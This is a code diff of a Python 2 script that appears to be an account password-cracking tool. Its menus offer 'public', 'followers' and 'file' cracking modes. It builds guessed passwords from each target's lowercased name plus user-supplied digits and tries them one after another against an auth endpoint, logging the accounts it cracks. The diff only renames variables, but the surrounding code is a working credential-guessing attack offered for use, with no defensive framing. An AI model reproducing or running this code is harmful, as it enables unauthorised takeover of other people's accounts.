@@ -820,10 +820,10 @@ def a_s():
 		print '\t    \x1b[1;35mNAME + NUMBER PASS PUBLIC CRACK\x1b[0;97m'
 		print(47*'-')
 		print('')
-		pass1 = raw_input('\x1b[1;92m Name + digit: ')
-		pass2 = raw_input('\x1b[1;92m Name + digit: ')
-		pass3 = raw_input('\x1b[1;92m Name + digit: ')
-		pass4 = raw_input('\x1b[1;92m Name + digit: ')
+		p1 = raw_input('\x1b[1;92m Name + digit: ')
+		p2 = raw_input('\x1b[1;92m Name + digit: ')
+		p3 = raw_input('\x1b[1;92m Name + digit: ')
+		p4 = raw_input('\x1b[1;92m Name + digit: ')
 		pass5 = raw_input('\x1b[1;92m Password: ')
 		pass6 = raw_input('\x1b[1;92m Password: ')
 		pass7 = raw_input('\x1b[1;92m Password: ')
@@ -852,10 +852,10 @@ def a_s():
 		print '\t    \x1b[1;35mNAME + NUMBER PASS CRACK FOLLOWERS\x1b[0;97m'
 		print(47*'-')
 		print('')
-		pass1 = raw_input('\x1b[1;92m Name + digit: ')
-		pass2 = raw_input('\x1b[1;92m Name + digit: ')
-		pass3 = raw_input('\x1b[1;92m Name + digit: ')
-		pass4 = raw_input('\x1b[1;92m Name + digit: ')
+		p1 = raw_input('\x1b[1;92m Name + digit: ')
+		p2 = raw_input('\x1b[1;92m Name + digit: ')
+		p3 = raw_input('\x1b[1;92m Name + digit: ')
+		p4 = raw_input('\x1b[1;92m Name + digit: ')
 		pass5 = raw_input('\x1b[1;92m Password: ')
 		pass6 = raw_input('\x1b[1;92m Password: ')
 		pass7 = raw_input('\x1b[1;92m Password: ')
@@ -884,10 +884,10 @@ def a_s():
 		print '\t    \x1b[1;35mNAME + NUMBER PASS FILE CRACK\x1b[0;97m'
 		print(47*'-')
 		print('')
-		pass1 = raw_input('\x1b[1;92m Name + digit: ')
-		pass2 = raw_input('\x1b[1;92m Name + digit: ')
-		pass3 = raw_input('\x1b[1;92m Name + digit: ')
-		pass4 = raw_input('\x1b[1;92m Name + digit: ')
+		p1 = raw_input('\x1b[1;92m Name + digit: ')
+		p2 = raw_input('\x1b[1;92m Name + digit: ')
+		p3 = raw_input('\x1b[1;92m Name + digit: ')
+		p4 = raw_input('\x1b[1;92m Name + digit: ')
 		pass5 = raw_input('\x1b[1;92m Password: ')
 		pass6 = raw_input('\x1b[1;92m Password: ')
 		pass7 = raw_input('\x1b[1;92m Password: ')
@@ -920,7 +920,7 @@ def a_s():
             user = arg
             uid, name = user.split('|')
             try:
-                pass1 = name.lower() + p1()
+                pass1 = name.lower() + p1
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -936,7 +936,7 @@ def a_s():
                     cp.close()
                     cps.append(uid + pass1)
                 else:
-                    pass2 = name.lower() + p2()
+                    pass2 = name.lower() + p2
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
@@ -952,7 +952,7 @@ def a_s():
                         cp.close()
                         cps.append(uid + pass2)
                     else:
-                        pass3 = name.lower() + p3()
+                        pass3 = name.lower() + p3
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
@@ -968,7 +968,7 @@ def a_s():
                             cp.close()
                             cps.append(uid + pass3)
                         else:
-                            pass4 = name.lower() +p4()
+                            pass4 = name.lower() + p4
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
